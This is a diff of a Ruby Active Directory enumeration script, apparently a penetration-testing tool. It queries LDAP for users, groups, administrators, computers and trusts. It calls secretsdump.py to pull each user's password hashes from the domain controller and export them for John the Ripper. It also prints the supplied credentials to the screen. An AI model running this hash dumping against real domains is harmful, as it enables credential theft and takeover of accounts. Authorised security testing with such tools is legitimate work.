@@ -11,7 +11,7 @@ require 'csv'
 require 'pp'
 require 'terminal-table'
 require_relative './objects.rb' #Allows the require to be determined from where the script runs rather than where the user runs the script
-require 'tty-spinner'
+
 
 Signal.trap("INT") { 
   shut_down 
@@ -73,6 +73,9 @@ opts = Trollop::options do
 	opt :redacted, "Output to CSV without sensitive information", :type => :boolean
 end
 
+if opts[:findadmins]
+	opts[:groupname] = "Administrators"
+end
 
 if opts[:all]
 	puts "Running all functions...".green
@@ -84,10 +87,8 @@ if opts[:all]
 	opts[:domaincomputers] = "all"
 end
 
-spinner = TTY::Spinner.new
 #create LDAP connections
 unless opts[:restore]
-	spinner.auto_spin
 	if opts[:ldaptype]
 		ldap_con = Net::LDAP.new(
 			{:host => opts[:host],
@@ -117,26 +118,20 @@ end
 
 #check LDAP & restore functionality
 unless opts[:restore]
-begin
-	if ldap_con.bind
-		puts "LDAP connection successful with credentials #{opts[:username]}:#{opts[:password]}\n".green
-		treebase = "dc=#{opts[:domain]}"
-		if opts[:tld].include? "."
-			#loop to deal with domains like a.b.c.d.e.f
-			opts[:tld].split(".").each do |domain|
-				treebase << ",DC=#{domain}"
-			end
+	begin
+		if ldap_con.bind
+			puts "[+] LDAP connection successful with credentials: #{opts[:domain]}\\#{opts[:username]}:#{opts[:password]}\n".green
+			tld = opts[:tld].split("\.").join(",dc=")
+			treebase = "dc=#{opts[:domain]},dc=#{tld}"
 		else
-			treebase << ",DC=#{opts[:tld]}"
+			puts "[-] Unable to authenticate to LDAP, Error: #{ldap_con.get_operation_result.message}, you need a username, password and domain".red
+			puts "Tried with #{opts[:domain]}\\#{opts[:username]}:#{opts[:password]}\n"
+			exit
 		end
-	else
-		puts "Unable to authenticate to LDAP, Error: #{ldap_con.get_operation_result.message}, you need a username, password and domain".red
+	rescue Net::LDAP::Error => e
+		puts "[-] Hmm, unable to connect to LDAP/LDAP #{e}".red
 		exit
 	end
-rescue Net::LDAP::Error => e
-	puts "Hmm, unable to connect to LDAP/LDAP #{e}".red
-	exit
-end
 else
 	YAML.load_file(opts[:restore]).each do |object|
 		if object.is_a? User
@@ -149,14 +144,13 @@ else
 	end
 end
 
+
 unless opts[:restore]
 
 	if opts[:enumtrusts]
 		puts "Enumerating Domain Trusts...".green
 		ldap_con.search( :base => treebase, :filter => Domain.domain_info) do |entry|
-			puts "\nQueried Domain Name: #{entry.dc.entries.reduce}"
-			puts "Queried Domain TLD: #{entry.dn.split("DC=")[-1]}"
-			puts "Queried DC: #{entry.masteredby.entries.to_s.split("CN=")[2].gsub(/\,$/, "")}\n\n"
+			Domain.new(entry)
 			Domain.current(entry)
 		end
 		ldap_con.search( :base => treebase, :filter => Domain.find_trusts) do |entry|
@@ -177,23 +171,11 @@ unless opts[:restore]
 		puts "---------------------------"
 	end
 
-	if opts[:findadmins]
-		spinner = TTY::Spinner.new("[:spinner] Enumeration all administrators...".green)
-		ldap_con.search( :base => treebase, :filter => User.find_admin) do |entry|
-			spinner.spin
-			User.new(entry,[])
-		end
-		User.all_users.each {|user| puts user.name}
-	end
-
 	if opts[:queryuser]
 		rows = []
-		spinner = TTY::Spinner.new("[:spinner] Enumeration #{opts[:queryuser]} user...".green)
 		ldap_con.search( :base => treebase, :filter => User.find_user(opts[:queryuser])) do |entry|
-			spinner.spin
 			member_of = []
 			ldap_con.search( :base => treebase, :filter => User.recursive_user_memberof(entry.dn)) do |memberofs|
-				spinner.spin
 				member_of << memberofs.name
 			end
 			@u = User.new(entry, member_of)
@@ -217,35 +199,29 @@ unless opts[:restore]
 
 	if opts[:enumgroups]
 		rows = []
-		spinner = TTY::Spinner.new("[:spinner] Enumeration all groups...".green)
 		ldap_con.search( :base => treebase, :filter => Group.find_all_groups()) do |entry|
 			group = Group.new(entry, nil)
-			member_of = []
 			ldap_con.search( :base => treebase, :filter => Group.recursive_memberof(group)) do |memberofs|
 				group.members << memberofs.name
-				User.new(memberofs, nil)
-				spinner.spin
+				User.new(memberofs, memberofs.memberof)
 			end
 			rows << [group.name, (group.admin ? "True".green : "False".red), group.members.count]
 		end
-		spinner.stop("\n[+] Found #{Group.all_groups.count} Groups".green)
 		puts  Terminal::Table.new :headings => ["Group Name", "Admin Group", "Number of Members"], :rows => rows
 	end
 
 	if opts[:enumallusers]
 		rows = []
 		count = 0
-		spinner = TTY::Spinner.new("[:spinner] Enumeration all users...".green)
 			ldap_con.search( :base => treebase, :filter => User.find_all_users) do |entry|
-				spinner.spin
 				print (count += 1).to_s.green
 				member_of = []
 				# pp entry
 				## You need to implement a flag to boolean nested and non nested enumeration
 				if !opts[:nonestedmembers]
+					puts "Hmm, enumerating the whole domain with nested group enumeration...that could take a while, maybe try --nonestedmembers".yellow
 					ldap_con.search( :base => treebase, :filter => User.recursive_user_memberof(entry.dn)) do |memberofs|
 						member_of << memberofs.name
-						spinner.spin
 					end
 				elsif
 						memberof = entry.memberof rescue nil
@@ -257,9 +233,8 @@ unless opts[:restore]
 				end
 				user = User.new(entry, member_of)
 				# puts "Name: #{user.name} - Admin:" + (user.admin ? " Trusere".green : " False".red) + (user.description ? "- Description: #{user.description}".yellow : "- Description: None".green)
-				rows << [user.name, (user.admin ? "True".green : "False".red), (user.description ? "#{user.description}".yellow : "None".green)]
+				rows << [user.name, (user.admin ? "True".green : "False".red), (user.description ? "Exists".yellow : "None".green)]
 			end
-			spinner.stop("\n[+] Found #{User.all_users.count} users".green)
 			puts  Terminal::Table.new :headings => ["Username", "Admin", "Description"], :rows => rows
 	end
 
@@ -274,10 +249,8 @@ unless opts[:restore]
 		elsif opts[:domaincomputers] == "domaincontrollers"
 			filter = Computer.find_all_domaincontrollers
 		end
-		spinner = TTY::Spinner.new("[:spinner] Enumeration #{opts[:domaincomputers]} computers...".green)
 		ldap_con.search( :base => treebase, :filter => filter) do |entry|
 			Computer.new(entry)
-			spinner.spin
 		end
 		Computer.all_computers.each do |computer|
 			rows << [computer.cn, computer.os, computer.sp, computer.dns, computer.ip]
@@ -288,9 +261,7 @@ unless opts[:restore]
 
 
 	if opts[:groupname]
-		spinner = TTY::Spinner.new("[:spinner] Enumeration #{opts[:groupname]} group...".green)
 		ldap_con.search( :base => treebase, :filter => Net::LDAP::Filter.construct("(name=#{opts[:groupname]}))")) do |entry|
-			spinner.spin
 			member_obj = entry.member rescue []
 			Group.new(entry,member_obj)
 		end
@@ -304,8 +275,10 @@ unless opts[:restore]
 		end
 		# use the memberof LDAP query to pull back all users and nested users in the group
 		ldap_con.search( :base => treebase, :filter => Group.recursive_memberof(Group.search_group)) do |entry|
-			spinner.spin
-			member_of = entry.memberof.entries.reduce rescue nil
+			member_of = []
+			entry.memberof.to_a.each do |memberofs|
+				member_of << memberofs.split(",")[0].gsub(/CN=/,'')
+			end
 			user = User.new(entry, member_of)
 			puts "Name: #{user.name} - admin: " + (user.admin ? "True".green : "False".red)
 		end
@@ -327,24 +300,41 @@ unless opts[:restore]
 		if opts[:dumphashes]
 			puts "------------------\n"
 			puts "Dumping Hashes...\nHashes:".green
-			#dump the hashes
-			# Child domain enumeration doesnt work
 			User.all_users.uniq! {|user| user.name}
 			unless User.all_users.empty?
-				User.all_users.each do |user|
-					output = ''
-					cmd = TTY::Command.new(output: output)
-					#this path is correct in both OSX and Kali
-					connection = cmd.run("python /usr/local/bin/secretsdump.py #{opts[:domain]}/#{opts[:username]}\:\"#{opts[:password]}\"\@#{opts[:host]} -just-dc-user \"#{opts[:domain]}/#{user.name}\"")
-					unless connection.out =~ /ERROR_DS_DRA_ACCESS_DENIED|ERROR_DS_DRA_BAD_DN/ #secretsdump doesnt output to STDERR, annoyingly
-						user.hash = connection.out.split("\n")[4]
-						User.hash_type(user)
-						puts user.hash
-					else
-						puts "Not enough privilege, aborting hashdump".red
-						throw :nopriv
+				#Something doesnt work here, needs some work
+				# if opts[:enumallusers]
+				# 	# output = ""
+				# 	cmd = TTY::Command.new
+				# 	connection = cmd.run("python /usr/local/bin/secretsdump.py #{opts[:domain]}/#{opts[:username]}\:\"#{opts[:password]}\"\@#{opts[:host]} -just-dc-ntlm")
+				# 	connection.each do |line|
+				# 		if line.include? ":::"
+				# 			User.all_hash(line)
+				# 		end
+				# 	end
+				# else
+					User.all_users.each do |user|
+						if user.enabled == false
+							next
+						end
+						output = ''
+						cmd = TTY::Command.new(output: output)
+						#this path is correct in both OSX and Kali
+						connection = cmd.run("python /usr/local/bin/secretsdump.py \'#{opts[:domain]}/#{opts[:username]}\:#{opts[:password]}\'\@#{opts[:host]} -just-dc-user \"#{opts[:domain]}/#{user.name}\"")
+						if connection.out =~ /\:\:\:$/
+							user.hash = connection.out.split("\n")[4]
+							user.hash_type = User.hash_type(user.hash)
+							puts user.hash
+						elsif connection.out =~ /[-] ERROR_DS_NAME_ERROR_NOT_FOUND: Name translation/
+							user.hash = "EMPTY"
+							user.hash_type = "EMPTY"
+						else		
+						puts connection.out				
+							# puts "Not enough privilege, aborting hashdump".red
+							# throw :nopriv
+						end
 					end
-				end
+				# end
 				puts "\nWriting to JTR readable format".green
 				File.open("spotlight_to_john.txt", "w+") do |line|
 					User.all_users.each do |user|
@@ -369,7 +359,7 @@ if opts[:csv]
 
 	unless User.all_users.empty?
 		CSV.open("users_output.csv", "w+") do |csv|
-			csv << ["Username", "Admin", "Enabled", "Logon Count", "Member of", "Description", "Created", "Changed", "Password Last Changed", "Last bad password attempt", "Expires", "Hash", "Hash Type", "Password"]
+			csv << ["Username", "Admin", "Enabled", "Logon Count", "Description", "Created", "Changed", "Password Last Changed", "Last bad password attempt", "Expires", "Hash", "Hash Type", "Password", "Member of"]
 			User.all_users.each do |user|
 				if user.member_of.nil? or user.member_of.empty?
 					member_of = []
@@ -387,7 +377,7 @@ if opts[:csv]
 					password = user.password
 					hash = user.hash
 				end
-				csv << [user.name, user.admin, user.enabled, user.logon_count, member_of.join(", "), user.description, user.when_created, user.when_changed, user.pwdlastset, user.bad_password_time, user.account_expires, hash, user.hash_type, password]
+				csv << [user.name, user.admin, user.enabled, user.logon_count, user.description, user.when_created, user.when_changed, user.pwdlastset, user.bad_password_time, user.account_expires, hash, user.hash_type, password, member_of.join(", ")]
 			end
 		end
 	end
@@ -431,5 +421,5 @@ if opts[:csv]
 end
 
 unless opts[:restore]
-	write_logs
+	# write_logs
 end
